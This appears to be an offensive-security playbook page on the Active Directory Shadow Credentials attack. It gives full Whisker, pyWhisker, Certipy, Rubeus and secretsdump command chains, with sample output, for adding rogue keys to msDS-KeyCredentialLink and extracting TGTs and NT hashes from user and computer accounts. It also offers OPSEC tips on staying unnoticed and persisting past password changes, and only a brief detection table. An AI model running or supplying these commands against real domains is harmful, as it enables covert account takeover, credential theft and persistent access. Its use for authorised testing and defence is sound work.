---
title: "Attack #25 — Shadow Credentials Attack (msDS-KeyCredentialLink)"
description: "Shadow Credentials is one of the stealthiest account takeover techniques in Active Directory. It abuses the msDS-KeyCredentialLink attribute — originally…"
category: active-directory
tags: ["active-directory", "kerberos", "adcs", "persistence", "hashing"]
tools: ["Impacket", "Rubeus", "Certipy", "PowerShell"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/AD-Attack/Category-Three/🟡 Attack #25 — Shadow Credentials Attack (msDS-KeyCredentialLink).md"
---
# 🟡 Attack #25 — Shadow Credentials Attack (msDS-KeyCredentialLink)

***

## 📖 How It Works

Shadow Credentials is one of the **stealthiest account takeover techniques** in Active Directory. It abuses the `msDS-KeyCredentialLink` attribute — originally designed for **Windows Hello for Business (WHfB)** — to register a rogue public key on a target user or computer object. Once the key is set, the attacker uses the corresponding private key to authenticate as the target via **PKINIT** (certificate-based Kerberos authentication), receiving a TGT and NT hash without ever knowing or changing the target's password.

### Why Shadow Credentials is Superior to Password Reset

| Aspect | Password Reset | Shadow Credentials |
|---|---|---|
| **Target notices?** | ✅ Yes — locked out immediately | ❌ No — original password still works |
| **Persistence** | One-time — target resets back | Persistent — survives password changes |
| **Detection** | Event 4724 — well-known | Event 5136 — less commonly monitored |
| **Prerequisite** | ForceChangePassword / GenericAll | GenericWrite / GenericAll / WriteDACL on target |
| **OPSEC** | Low | High |

### Requirements

- **ADCS deployed** (or at least PKINIT enabled in the domain)
- **Domain functional level 2016+** (for `msDS-KeyCredentialLink` attribute)
- **Write access to target's `msDS-KeyCredentialLink`** (GenericWrite, GenericAll, or explicit write)

***

## ⚙️ Prerequisites

| Requirement | Detail |
|---|---|
| **Write access to msDS-KeyCredentialLink** | GenericWrite, GenericAll on target user/computer |
| **PKINIT / ADCS in environment** | Domain must support certificate-based auth |
| **Domain functional level 2016+** | Attribute doesn't exist on older schemas |

***

## 🛠️ Tools

| Tool | Platform | Notes |
|---|---|---|
| **Whisker** | Windows | Add/remove/list shadow credentials |
| **pyWhisker** | Linux | Python implementation |
| **Certipy** | Linux | `shadow auto` — automated full chain |
| **DSInternals** | Windows/PowerShell | `Set-DomainObject` key credential manipulation |
| **Rubeus** | Windows | PKINIT authentication with the shadow cert |

***

## 💻 Full Commands

### 🔴 Whisker (Windows)

```powershell
# ── Add shadow credential to target user ──────────────────────────────────────
.\Whisker.exe add /target:targetadmin /domain:corp.local /dc:DC01.corp.local

# Output:
# [*] No existing DeviceCredentials found
# [*] Generated key pair
# [*] DeviceID: a1b2c3d4-...
# [*] Adding KeyCredential
# [*] Use Rubeus with the following command:
# Rubeus.exe asktgt /user:targetadmin /certificate:<base64_pfx> /password:<pfx_pass> /ptt

# ── Run the outputted Rubeus command ──────────────────────────────────────────
.\Rubeus.exe asktgt /user:targetadmin /certificate:<base64_from_whisker> \
  /password:<password_from_whisker> /ptt /getcredentials

# Output includes NT hash via U2U

# ── List existing shadow credentials ──────────────────────────────────────────
.\Whisker.exe list /target:targetadmin /domain:corp.local /dc:DC01.corp.local

# ── Remove shadow credential (cleanup) ────────────────────────────────────────
.\Whisker.exe remove /target:targetadmin /deviceid:a1b2c3d4-... \
  /domain:corp.local /dc:DC01.corp.local
```

### 🔴 pyWhisker (Linux)

```bash
# ── Add shadow credential ────────────────────────────────────────────────────
python3 pywhisker.py -d corp.local -u low_user -p 'Password1' \
  --target targetadmin --action add --dc-ip 10.10.10.10

# Output: PFX certificate file and password

# ── Authenticate with the certificate ─────────────────────────────────────────
certipy auth -pfx <generated_pfx_file> -dc-ip 10.10.10.10
# Returns TGT + NT hash

# ── List ──────────────────────────────────────────────────────────────────────
python3 pywhisker.py -d corp.local -u low_user -p 'Password1' \
  --target targetadmin --action list --dc-ip 10.10.10.10

# ── Remove ────────────────────────────────────────────────────────────────────
python3 pywhisker.py -d corp.local -u low_user -p 'Password1' \
  --target targetadmin --action remove --device-id a1b2c3d4 --dc-ip 10.10.10.10
```

### 🔴 Certipy Shadow Auto (Easiest — Linux)

```bash
# ── Full automated chain — add key, auth, get hash ───────────────────────────
certipy shadow auto -u low_user@corp.local -p 'Password1' \
  -account targetadmin -dc-ip 10.10.10.10

# Output:
# [*] Saved PFX to 'targetadmin.pfx'
# [*] Got TGT for 'targetadmin@corp.local'
# [*] Got hash: aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe
```

### 🔴 Shadow Credentials on Computer Objects

```bash
# ── Works on computer objects too (compromise the machine) ────────────────────
certipy shadow auto -u low_user@corp.local -p 'Password1' \
  -account 'TARGET$' -dc-ip 10.10.10.10

# Use the machine's NT hash to:
# - Silver Ticket to services on that machine
# - SecretsDump for local SAM/LSA
secretsdump.py corp.local/'TARGET$'@TARGET.corp.local \
  -hashes :2b576acbe6bcfda7294d6bd18041b8fe
```

***

## 🎯 OPSEC Tips

- **Shadow Credentials persist across password changes** — the key credential remains valid even after target changes their password
- **Always clean up** — remove the DeviceID from `msDS-KeyCredentialLink` after extracting the hash/TGT
- **Shadow Credentials fail if WHfB is not enabled** and there's no ADCS — PKINIT must be supported
- **Computer objects work too** — you can Shadow Credential a computer to get its machine account hash
- **Most OPSEC-friendly takeover** — the target user notices nothing; their password still works

***

## 🛡️ Detection — Event IDs

| Event ID | Source | What to Look For |
|---|---|---|
| **5136** | Security Log (DC) | Modification of `msDS-KeyCredentialLink` attribute |
| **4768** | Security Log (DC) | TGT request via PKINIT (Pre-Auth Type 16) — certificate-based auth for a non-smart-card user |

***

## 🔗 Attack Chain Context

```
[Shadow Credentials] ──→ Stealthy Account Takeover Without Password Change
         │
         ├──→ 🔑 Write msDS-KeyCredentialLink → auth as target via PKINIT
         ├──→ 🔒 Survives password changes — persistent until key is removed
         ├──→ 💻 Works on users AND computers
         ├──→ 🔗 Prereqs: GenericWrite (#20), GenericAll (#19), WriteDACL (#21)
         └──→ 💀 Defeated by: monitor 5136, audit msDS-KeyCredentialLink, disable WHfB if unused
```

***

> ✅ **Attack #25 — Shadow Credentials complete.**
